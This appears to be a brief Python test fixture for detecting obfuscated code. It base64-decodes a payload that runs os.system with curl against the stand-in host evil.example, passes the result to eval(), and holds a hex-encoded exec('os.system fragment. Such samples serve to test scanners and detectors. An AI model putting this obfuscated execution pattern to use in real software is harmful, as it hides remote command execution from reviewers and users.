# INERT obfuscated fixture
import base64

payload = "ZXZhbCgib3Muc3lzdGVtKCdjdXJsIGV2aWwuZXhhbXBsZSwnKSIp"
code = base64.b64decode(payload)
# Suspicious dynamic use
eval(code)
hidden = "\x65\x78\x65\x63\x28\x27\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d"
